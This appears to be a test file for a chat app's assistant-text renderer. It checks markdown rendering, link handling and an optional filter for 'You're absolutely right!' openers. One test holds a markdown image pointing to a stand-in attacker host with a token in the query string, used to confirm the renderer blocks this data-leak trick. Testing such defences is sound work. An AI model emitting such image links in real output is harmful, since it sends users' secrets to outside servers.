import { ok } from "@conducted/shared";
import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const state = vi.hoisted(() => ({
	markdown: "default",
	strip: false,
	openUrl: vi.fn(),
}));

vi.mock("../../core/hooks.ts", () => ({
	useActions: () => ({ app: { openUrl: state.openUrl } }),
	useSetting: (key: string) => (key === "not_absolutely_right" ? state.strip : state.markdown),
}));

const { AssistantText } = await import("./AssistantText.tsx");
const { ServicesProvider } = await import("../../core/context.tsx");
const { createTestContainer } = await import("../../test/container.ts");

beforeEach(() => {
	state.openUrl.mockReset().mockResolvedValue(ok(undefined));
});

afterEach(() => {
	cleanup();
	state.markdown = "default";
	state.strip = false;
});

describe("CHAT-06 assistant text", () => {
	it("renders an unclosed code fence as a code block without throwing", () => {
		render(<AssistantText text={"Here is the code:\n```ts\nconst answer = 42;"} />);
		expect(screen.getByText("const answer = 42;")).toBeTruthy();
		// The block is a code block; it names no language, as Conductor's does not (D098).
		expect(document.querySelector("[data-code-surface]")).not.toBeNull();
	});

	it("keeps a leading absolutely-right phrase when the setting is off", () => {
		render(<AssistantText text={"You're absolutely right! The fix is small."} />);
		expect(screen.getByText(/You're absolutely right!/)).toBeTruthy();
	});

	it("strips a leading absolutely-right phrase when the setting is on", () => {
		state.strip = true;
		render(<AssistantText text={"You're absolutely right! The fix is small."} />);
		expect(screen.queryByText(/absolutely right/i)).toBeNull();
		expect(screen.getByText("The fix is small.")).toBeTruthy();
	});

	it("renders headings, lists and tables", () => {
		render(
			<AssistantText text={"# Summary\n\n- one\n- two\n\n| A | B |\n| --- | --- |\n| 1 | 2 |"} />,
		);
		expect(screen.getByRole("heading", { level: 1, name: "Summary" })).toBeTruthy();
		expect(screen.getAllByRole("listitem")).toHaveLength(2);
		expect(screen.getByRole("table")).toBeTruthy();
		expect(screen.getByText("1")).toBeTruthy();
	});

	it("renders a callout with its kind", () => {
		render(<AssistantText text={"> [!WARNING]\n> Check the path first."} />);
		expect(screen.getByText("Warning")).toBeTruthy();
		expect(screen.getByText("Check the path first.")).toBeTruthy();
	});

	it("marks the Tufte style", () => {
		state.markdown = "tufte";
		const { container } = render(<AssistantText text={"Some prose."} />);
		expect(container.querySelector('[data-markdown-style="tufte"]')).toBeTruthy();
	});

	it("opens links through the app opener", () => {
		render(<AssistantText text={"[Open the docs](https://example.com/docs)"} />);
		fireEvent.click(screen.getByRole("link", { name: "Open the docs" }));
		expect(state.openUrl).toHaveBeenCalledWith("https://example.com/docs");
	});

	it("renders an image from assistant text", () => {
		const opened = createTestContainer();
		try {
			render(
				<ServicesProvider container={opened.container}>
					<AssistantText text={"![A chart](/tmp/chart.png)"} />
				</ServicesProvider>,
			);
			expect(screen.getByRole("img", { name: "A chart" }).getAttribute("src")).toBe(
				opened.container.platform.fs.assetUrl("/tmp/chart.png"),
			);
		} finally {
			cleanup();
			opened.close();
		}
	});

	it("gives a non-web link no link element, so nothing can navigate the app window", () => {
		render(<AssistantText text={"[Open the file](file:///tmp/notes.txt)"} />);
		expect(screen.queryByRole("link")).toBeNull();
		fireEvent.click(screen.getByText("Open the file"));
		expect(state.openUrl).not.toHaveBeenCalled();
	});

	it("never loads an image from a web address, because the address could carry data out", () => {
		render(<AssistantText text={"![secret](https://evil.test/p.png?q=token)"} />);
		expect(screen.queryByRole("img")).toBeNull();
		fireEvent.click(screen.getByRole("link", { name: "secret" }));
		expect(state.openUrl).toHaveBeenCalledWith("https://evil.test/p.png?q=token");
	});

	it("keys equal list items and table cells by position", () => {
		const errors = vi.spyOn(console, "error").mockImplementation(() => {});
		render(<AssistantText text={"- yes\n- yes\n\n| A | B |\n| --- | --- |\n| yes | yes |"} />);
		const warnings = errors.mock.calls.map((call) => call.join(" "));
		errors.mockRestore();
		expect(warnings.some((line) => line.includes("same key"))).toBe(false);
		expect(screen.getAllByRole("listitem")).toHaveLength(2);
		expect(screen.getAllByRole("cell")).toHaveLength(2);
	});
});
